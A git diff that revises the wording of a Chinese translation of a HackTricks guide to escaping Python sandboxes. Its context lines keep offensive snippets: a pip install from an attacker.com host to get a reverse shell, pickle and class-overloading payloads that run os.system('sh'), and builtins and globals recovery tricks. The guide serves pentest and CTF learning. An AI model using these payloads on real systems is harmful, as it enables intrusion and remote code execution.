@@ -17,9 +17,9 @@
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### 从黑客的角度看待您的网络应用、网络和云
+**从黑客的角度审视您的网络应用、网络和云**
 
-**查找并报告具有实际商业影响的关键可利用漏洞。** 使用我们 20 多个自定义工具来映射攻击面，查找让您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。
+**查找并报告具有实际商业影响的关键可利用漏洞。** 使用我们 20 多个自定义工具来映射攻击面，发现让您提升权限的安全问题，并使用自动化漏洞收集重要证据，将您的辛勤工作转化为有说服力的报告。
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
@@ -60,7 +60,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-记住，_**open**_ 和 _**read**_ 函数可以用于 **读取文件** 在 python 沙箱内，并 **编写一些代码** 你可以 **执行** 以 **绕过** 沙箱。
+记住，_**open**_ 和 _**read**_ 函数可以用于 **读取文件** 在 python 沙箱内，并 **编写一些代码** 你可以 **执行** 来 **绕过** 沙箱。
 
 {% hint style="danger" %}
 **Python2 input()** 函数允许在程序崩溃之前执行 python 代码。
@@ -89,13 +89,13 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-有关pickle工作原理的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+有关 pickle 工作原理的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
-### Pip包
+### Pip 包
 
-技巧由**@isHaacK**分享
+技巧由 **@isHaacK** 分享
 
-如果您可以访问`pip`或`pip.main()`，您可以安装任意包并通过调用获得反向shell:
+如果您可以访问 `pip` 或 `pip.main()`，您可以安装任意包并通过调用获得反向 shell:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
@@ -201,11 +201,11 @@ class _:pass
 ```
 ### RCE 创建对象和重载
 
-如果你可以 **声明一个类** 并 **创建该类的对象**，你可以 **编写/覆盖不同的方法**，这些方法可以在 **不需要直接调用** 的情况下 **被触发**。
+如果你可以 **声明一个类** 并 **创建该类的对象**，你可以 **编写/覆盖不同的方法**，这些方法可以在 **不需要直接调用它们** 的情况下被 **触发**。
 
 #### 使用自定义类的 RCE
 
-你可以修改一些 **类方法**（_通过覆盖现有类方法或创建新类_），使它们在 **被触发** 时 **执行任意代码**，而无需直接调用它们。
+你可以修改一些 **类方法**（_通过覆盖现有类方法或创建一个新类_），使它们在 **触发** 时 **执行任意代码**，而无需直接调用它们。
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -274,7 +274,7 @@ Sub['import os; os.system("sh")']
 ```
 #### 创建带有异常的对象
 
-当**异常被触发**时，**Exception**的一个对象会被**创建**，而无需您直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的技巧）：
+当**异常被触发**时，**Exception**的一个对象会被**创建**，而无需您直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的一个技巧）：
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -338,7 +338,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### No Builtins
 
 当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有的全局函数**（如 `open`、`import`、`print`...）**都没有加载**。\
-然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看似无害，但其中一些 **也在内部导入危险** 的功能，可以被访问以获得 **任意代码执行**。
+然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看起来可能是无害的，但其中一些 **也在内部导入危险** 的功能，可以被访问以获得 **任意代码执行**。
 
 在以下示例中，你可以观察到如何 **滥用** 一些被加载的 "**无害**" 模块，以 **访问** **危险** **功能**。 
 
@@ -424,11 +424,11 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 来查找数十/**数百**个 **位置**，您可以找到 **globals**。
+[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **位置**，您可以找到 **globals**。
 
 ## 发现任意执行
 
-在这里，我想解释如何轻松发现 **加载的更危险功能** 并提出更可靠的利用。
+在这里，我想解释如何轻松发现 **更危险的功能** 并提出更可靠的利用方法。
 
 #### 通过绕过访问子类
 
@@ -561,7 +561,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## 递归搜索内置对象、全局变量...
 
 {% hint style="warning" %}
-这真是**太棒了**。如果你**正在寻找像 globals、builtins、open 或其他任何对象**，只需使用这个脚本**递归查找可以找到该对象的地方。**
+这真是**太棒了**。如果你**正在寻找像 globals、builtins、open 或其他任何对象**，只需使用这个脚本来**递归查找可以找到该对象的地方。**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -686,7 +686,7 @@ main()
 
 ## Python 格式字符串
 
-如果您**发送**一个将要**格式化**的**字符串**给python，您可以使用`{}`来访问**python内部信息。** 您可以使用之前的示例来访问全局变量或内置函数，例如。
+如果您**发送**一个**字符串**给 python，该字符串将被**格式化**，您可以使用 `{}` 来访问**python 内部信息。** 您可以使用之前的示例来访问全局变量或内置函数，例如。
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -726,7 +726,7 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**更多关于** **格式** **字符串** 示例的例子可以在 [**https://pyformat.info/**](https://pyformat.info) 找到
+**更多关于** **格式** **字符串** **的示例** 可以在 [**https://pyformat.info/**](https://pyformat.info) 找到
 
 {% hint style="danger" %}
 还请查看以下页面，了解将从 Python 内部对象中读取敏感信息的工具：
@@ -794,10 +794,10 @@ pydll = LibraryLoader(PyDLL)
 ## 解剖 Python 对象
 
 {% hint style="info" %}
-如果你想深入**了解** **python 字节码**，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+如果你想深入了解 **python 字节码**，请阅读这篇关于该主题的 **精彩** 文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-在某些 CTF 中，你可能会被提供一个**自定义函数的名称，其中包含标志**，你需要查看**函数**的**内部**以提取它。
+在一些 CTF 中，你可能会被提供一个 **自定义函数的名称，其中包含标志**，你需要查看 **函数** 的 **内部** 以提取它。
 
 这是要检查的函数：
 ```python
@@ -920,7 +920,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-注意，**如果你无法在python沙箱中导入`dis`**，你可以获取函数的**字节码**（`get_flag.func_code.co_code`）并在本地**反汇编**它。你不会看到正在加载的变量的内容（`LOAD_CONST`），但你可以从（`get_flag.func_code.co_consts`）中推测它们，因为`LOAD_CONST`也会告诉正在加载的变量的偏移量。
+注意，如果**您无法在python沙箱中导入`dis`**，您可以获取函数的**字节码**（`get_flag.func_code.co_code`）并在本地**反汇编**它。您将看不到正在加载的变量的内容（`LOAD_CONST`），但您可以从（`get_flag.func_code.co_consts`）中推测它们，因为`LOAD_CONST`也会告诉您正在加载的变量的偏移量。
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -945,7 +945,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## 编译 Python
 
 现在，让我们想象一下，您可以以某种方式**转储您无法执行的函数的信息**，但您**需要**去**执行**它。\
-就像在以下示例中，您**可以访问该函数的代码对象**，但仅仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
+就像在以下示例中，您**可以访问该函数的代码对象**，但仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
 ```python
 def get_flag(some_input):
 var1=1
@@ -991,7 +991,7 @@ types.CodeType.__doc__
 ### 重建泄露的函数
 
 {% hint style="warning" %}
-在以下示例中，我们将直接从函数代码对象中获取重建函数所需的所有数据。在一个**真实的例子**中，执行函数**`code_type`**所需的所有**值**就是**你需要泄露的**内容。
+在以下示例中，我们将直接从函数代码对象获取重建函数所需的所有数据。在一个**真实的例子**中，执行函数**`code_type`**所需的所有**值**就是**你需要泄露的**。
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1005,8 +1005,8 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### 绕过防御
 
-在本文开头的前几个例子中，您可以看到**如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以**在一行中执行整个脚本**，包括循环和其他内容（我们也可以使用**`exec`**做到这一点）。\
-无论如何，有时在本地机器上**创建**一个**编译对象**并在**CTF 机器**上执行它可能是有用的（例如，因为我们在 CTF 中没有 `compiled` 函数）。
+在本文开头的前几个例子中，您可以看到 **如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以 **在一行中执行整个脚本**，包括循环和其他内容（我们也可以使用 **`exec`** 做同样的事情）。\
+无论如何，有时在本地机器上 **创建** 一个 **编译对象** 并在 **CTF 机器** 上执行它可能是有用的（例如，因为我们在 CTF 中没有 `compiled` 函数）。
 
 例如，让我们手动编译并执行一个读取 _./poc.py_ 的函数：
 ```python
@@ -1080,9 +1080,9 @@ print(f"\nNot a Super User!!!\n")
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### 从黑客的角度看待您的网络应用、网络和云
+**从黑客的角度看待您的网络应用程序、网络和云**
 
-**发现并报告具有实际商业影响的关键可利用漏洞。** 使用我们20多个自定义工具来映射攻击面，找到让您提升权限的安全问题，并使用自动化漏洞收集重要证据，将您的辛勤工作转化为有说服力的报告。
+**发现并报告具有实际商业影响的关键可利用漏洞。** 使用我们20多个自定义工具来映射攻击面，查找让您提升权限的安全问题，并使用自动化漏洞收集重要证据，将您的辛勤工作转化为有说服力的报告。
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
@@ -1096,7 +1096,7 @@ print(f"\nNot a Super User!!!\n")
 
 * 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github库提交PR分享黑客技巧。
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github库提交PR来分享黑客技巧。
 
 </details>
 {% endhint %}
